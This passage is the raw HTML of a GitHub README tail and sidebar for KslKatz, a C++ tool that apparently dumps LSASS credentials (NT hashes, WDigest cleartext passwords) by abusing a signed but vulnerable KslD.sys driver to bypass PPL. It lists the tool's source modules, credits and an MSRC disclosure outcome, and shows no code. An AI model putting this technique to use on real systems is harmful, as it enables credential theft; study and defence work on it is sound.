+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Project Structure</h2><a id="user-content-project-structure" class="anchor" aria-label="Permalink: Project Structure" href="https://github.com/k3nundrum/KslKatz#project-structure"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>KslKatz/
+  KslKatz.sln                  Visual Studio 2022 solution
+  KslKatz.vcxproj              Project file (x64, C++20, v143)
+  KslKatz.vcxproj.filters      Source file grouping
+  src/
+    common.h                   Shared types, unaligned read helpers, credential structs
+    driver.h / driver.cpp      KslD IOCTL interface, SCM service management,
+                               SHA256 driver verification, embedded driver deployment
+    driver_payload.h           Vulnerable KslD.sys as uint8_t array (333KB, 20K lines)
+    memory.h / memory.cpp      Page table walk (PML4/PDPT/PD/PT + transition pages),
+                               proc_read, read_ptr, resolve_rip, read_ustr, pattern scan
+    crypto.h / crypto.cpp      AES-CFB128 (manual ECB+XOR), 3DES-CBC, RC4, DES-ECB,
+                               MD5, SHA256 -- all via Windows CNG (bcrypt.lib)
+    lsa.h / lsa.cpp            KASLR bypass, EPROCESS leak via SystemHandleInformation,
+                               LSA key extraction (local file scan + BCRYPT traversal),
+                               LogonSessionList walk, MSV1_0 credential decryption
+    wdigest.h / wdigest.cpp    l_LogSessList location via local file scan,
+                               linked list walk, 3DES-CBC password decryption
+    main.cpp                   Orchestration, phase sequencing, output formatting
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="KslKatz/
+  KslKatz.sln                  Visual Studio 2022 solution
+  KslKatz.vcxproj              Project file (x64, C++20, v143)
+  KslKatz.vcxproj.filters      Source file grouping
+  src/
+    common.h                   Shared types, unaligned read helpers, credential structs
+    driver.h / driver.cpp      KslD IOCTL interface, SCM service management,
+                               SHA256 driver verification, embedded driver deployment
+    driver_payload.h           Vulnerable KslD.sys as uint8_t array (333KB, 20K lines)
+    memory.h / memory.cpp      Page table walk (PML4/PDPT/PD/PT + transition pages),
+                               proc_read, read_ptr, resolve_rip, read_ustr, pattern scan
+    crypto.h / crypto.cpp      AES-CFB128 (manual ECB+XOR), 3DES-CBC, RC4, DES-ECB,
+                               MD5, SHA256 -- all via Windows CNG (bcrypt.lib)
+    lsa.h / lsa.cpp            KASLR bypass, EPROCESS leak via SystemHandleInformation,
+                               LSA key extraction (local file scan + BCRYPT traversal),
+                               LogonSessionList walk, MSV1_0 credential decryption
+    wdigest.h / wdigest.cpp    l_LogSessList location via local file scan,
+                               linked list walk, 3DES-CBC password decryption
+    main.cpp                   Orchestration, phase sequencing, output formatting" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Credits</h2><a id="user-content-credits" class="anchor" aria-label="Permalink: Credits" href="https://github.com/k3nundrum/KslKatz#credits"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<ul dir="auto">
+<li><a href="https://github.com/gentilkiwi/mimikatz"><strong>Mimikatz</strong></a> by Benjamin Delpy -- LSA structure definitions, signature patterns, credential decryption logic, and the foundational research that made all of this possible</li>
+<li><a href="https://github.com/RainbowDynamix/GhostKatz"><strong>GhostKatz</strong></a> by Julian Pena and Eric Esquivel -- local signature scan approach, WDigest list walking, and the Superfetch address translation concept</li>
+<li><a href="https://github.com/andreisss/KslDump"><strong>KslDump</strong></a>  by Andrea Bocchetti --  KslD.sys BYOVD vulnerability discovery, IOCTL reverse engineering, and the original Python PoC</li>
+</ul>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Responsible Disclosure</h2><a id="user-content-responsible-disclosure" class="anchor" aria-label="Permalink: Responsible Disclosure" href="https://github.com/k3nundrum/KslKatz#responsible-disclosure"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The KslD.sys vulnerability was reported to Microsoft Security Response Center (MSRC). It was closed as <strong>"Not a Vulnerability"</strong> with the following rationale:</p>
+<blockquote>
+<p dir="auto"><em>"The described attack depends on pre-existing administrative privileges. No evidence was provided showing how those privileges were obtained. Reports that assume administrative or root access without demonstrating a vulnerability that grants those privileges are considered lower impact, as an attacker with such access could already perform more severe actions."</em></p>
+</blockquote>
+<p dir="auto">No CVE was assigned. No fix was issued. The vulnerable driver remains on disk.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Disclaimer</h2><a id="user-content-disclaimer" class="anchor" aria-label="Permalink: Disclaimer" href="https://github.com/k3nundrum/KslKatz#disclaimer"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">This tool is provided for authorized security testing and educational purposes only. Use it only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.</p>
+<hr>
+<div align="center" dir="auto">
+<p dir="auto"><em>Built with C++20 | No external dependencies | Single standalone executable</em></p>
+</div>
+</article></div></div></div></div></div></div></div><div class="prc-PageLayout-PaneWrapper-pHPop pr-2" style="--offset-header:0px;--spacing-row:var(--spacing-none);--spacing-column:var(--spacing-none)" data-is-hidden="false" data-position="end"><div class="prc-PageLayout-HorizontalDivider-JLVqp prc-PageLayout-PaneHorizontalDivider-9tbnE" data-variant-narrow="none" data-variant-regular="none" data-position="end" style="--spacing-divider:var(--spacing-none);--spacing:var(--spacing-none)"></div><div class="prc-PageLayout-Pane-AyzHK" style="--spacing:var(--spacing-normal);--pane-min-width:256px;--pane-max-width:calc(100vw - var(--pane-max-width-diff));--pane-width-size:var(--pane-width-large);--pane-width:320px"><rails-partial data-partial-name="codeViewRepoRoute.Sidebar" class="RailsPartial-module__d-contents__G5m4w">
+
+<div class="BorderGrid ">
+  <div class="BorderGrid-row">
+    <div class="BorderGrid-cell">
+      <div class="hide-sm hide-md">
+  <h2 class="tmp-mb-3 h4">About</h2>
+
+      <p class="f4 tmp-my-3">
+        Combining KslDump and GhostKatz to dump LSASS using no-fix KslD.sys memory read to bypass PPL. Extracts MSV1_0 NT hashes and WDigest cleartext passwords (if enabled) from LSASS using a Microsoft-signed driver.
+      </p>
+
+
+    <h3 class="sr-only">Resources</h3>
+    <div class="mt-2">
+      <a class="Link--muted" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:readme&quot;}" href="https://github.com/k3nundrum/KslKatz#readme-ov-file">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book mr-2 tmp-mr-2">
+    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
+</svg>
+        Readme
+</a>    </div>
+
+  
+
+
+
+
+
+  <include-fragment src="/k3nundrum/KslKatz/hovercards/citation/sidebar_partial?tree_name=main" data-nonce="v2:9b8d6583-3664-bc22-7825-ec82d6f6b384" data-view-component="true" class="is-error"><slot></slot>
+  
+
+  <div data-show-on-forbidden-error="">
+    <div class="Box">
+  <div class="blankslate-container">
+    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
+      
+
+      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
+</h3>
+      <p data-view-component="true" class="blankslate-description">        </p><p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="https://github.com/k3nundrum/KslKatz" aria-label="Please reload this page">Please reload this page</a>.</p>
+<p></p>
+
+</div>  </div>
+</div>  </div>
+</include-fragment>
+    <div class="mt-2">
+      <a href="https://github.com/k3nundrum/KslKatz/activity" data-view-component="true" class="Link Link--muted"><svg text="gray" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pulse mr-2 tmp-mr-2">
+    <path d="M6 2c.306 0 .582.187.696.471L10 10.731l1.304-3.26A.751.751 0 0 1 12 7h3.25a.75.75 0 0 1 0 1.5h-2.742l-1.812 4.528a.751.751 0 0 1-1.392 0L6 4.77 4.696 8.03A.75.75 0 0 1 4 8.5H.75a.75.75 0 0 1 0-1.5h2.742l1.812-4.529A.751.751 0 0 1 6 2Z"></path>
+</svg>
+        <span class="color-fg-muted">Activity</span></a>    </div>
+
+
+    <h3 class="sr-only">Stars</h3>
+    <div class="mt-2">
+      <a href="https://github.com/k3nundrum/KslKatz/stargazers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star mr-2 tmp-mr-2">
+    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
+</svg>
+        <strong>4</strong>
+        stars</a>    </div>
+
+    <h3 class="sr-only">Watchers</h3>
+    <div class="mt-2">
+      <a href="https://github.com/k3nundrum/KslKatz/watchers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-eye mr-2 tmp-mr-2">
+    <path d="M8 2c1.981 0 3.671.992 4.933 2.078 1.27 1.091 2.187 2.345 2.637 3.023a1.62 1.62 0 0 1 0 1.798c-.45.678-1.367 1.932-2.637 3.023C11.67 13.008 9.981 14 8 14c-1.981 0-3.671-.992-4.933-2.078C1.797 10.83.88 9.576.43 8.898a1.62 1.62 0 0 1 0-1.798c.45-.677 1.367-1.931 2.637-3.022C4.33 2.992 6.019 2 8 2ZM1.679 7.932a.12.12 0 0 0 0 .136c.411.622 1.241 1.75 2.366 2.717C5.176 11.758 6.527 12.5 8 12.5c1.473 0 2.825-.742 3.955-1.715 1.124-.967 1.954-2.096 2.366-2.717a.12.12 0 0 0 0-.136c-.412-.621-1.242-1.75-2.366-2.717C10.824 4.242 9.473 3.5 8 3.5c-1.473 0-2.825.742-3.955 1.715-1.124.967-1.954 2.096-2.366 2.717ZM8 10a2 2 0 1 1-.001-3.999A2 2 0 0 1 8 10Z"></path>
+</svg>
+        <strong>0</strong>
+        watching</a>    </div>
+
+    <h3 class="sr-only">Forks</h3>
+    <div class="mt-2">
+      <a href="https://github.com/k3nundrum/KslKatz/forks" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2 tmp-mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>
+        <strong>1</strong>
+        fork</a>    </div>
+
+
+    <div class="mt-2">
+      <a class="Link--muted" href="https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fk3nundrum%2FKslKatz&amp;report=k3nundrum+%28user%29">
+          Report repository
+</a>    </div>
+</div>
+
+    </div>
+  </div>
+
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          <h2 class="h4 tmp-mb-3" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame">
+  <a href="https://github.com/k3nundrum/KslKatz/releases" data-view-component="true" class="Link--primary no-underline Link" data-turbo-frame="repo-content-turbo-frame">Releases</a></h2>
+
+    <div class="text-small color-fg-muted">No releases published</div>
+
+        </div>
+      </div>
+
+  
+  
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          
+<h2 class="h4 tmp-mb-3">
+  <a href="https://github.com/users/k3nundrum/packages?repo_name=KslKatz" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Packages
+      <span title="0" data-view-component="true" class="Counter ml-1 tmp-ml-1">0</span></a></h2>
+
+
+
+      <div class="text-small color-fg-muted">
+        No packages published <br>
+      </div>
+
+
+
+        </div>
+      </div>
+
+  
+  
+    <div class="BorderGrid-row">
+      <div class="BorderGrid-cell">
+        
+  <h2 class="h4 tmp-mb-3">
+  <a href="https://github.com/k3nundrum/KslKatz/graphs/contributors" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Contributors
+      <span title="0" data-view-component="true" class="Counter ml-1 tmp-ml-1">0</span></a></h2>
+
+
+      <div class="text-small color-fg-muted">
+        No contributors
+      </div>
+
+
+
+      </div>
+    </div>
+
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          <h2 class="h4 tmp-mb-3">Languages</h2>
+<div class="mb-2">
+  <span data-view-component="true" class="Progress">
+    <span style="background-color:#f34b7d !important;;width: 100.0%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
+</span></div>
+<ul class="list-style-none">
+    <li class="d-inline">
+        <span class="d-inline-flex flex-items-center flex-nowrap text-small tmp-mr-3">
+          <svg style="color:#f34b7d;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2 tmp-mr-2">
+    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+</svg>
+          <span class="color-fg-default text-bold mr-1">C++</span>
+          <span>100.0%</span>
+        </span>
+    </li>
+</ul>
+
+        </div>
+      </div>
+
+  
+  </div>
+</rails-partial></div><div class="prc-PageLayout-VerticalDivider-9QRmK prc-PageLayout-PaneVerticalDivider-le57g" data-variant-narrow="none" data-variant-regular="none" data-position="end" style="--spacing:var(--spacing-none)"></div></div></div></div></div></div></div></div></div></div></div><div class="ScrollMarksContainer-module__scrollMarksContainer__Eu7uU" id="find-result-marks-container"></div><div class="d-none"></div><div class="d-none"></div></div> <!-- --> <!-- --> </div>
+</react-app>
+
+
+
+
+  </div>
+
+</turbo-frame>
+
+    </main>
+  </div>
+
+  </div>
+
+          
+
+
+
+    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-locale="en" data-initial-cookie-consent-allowed="" data-cookie-consent-required="false" data-catalyst=""></ghcc-consent>
+
+
+
+
+  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    You can’t perform that action at this time.
+  </div>
+
+    
+  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open="">
+    <summary role="button" aria-label="Close dialog"></summary>
+    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
+      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog="">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+      </button>
+      <div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+    </details-dialog>
+  </details>
+
+
+    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;"></div>
+</div>
+
+    
+  <div class="zeroclipboard-container position-absolute right-0 top-0">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2 tmp-m-2">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2 tmp-m-2">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+  <div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+
+
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+
+</body></html>
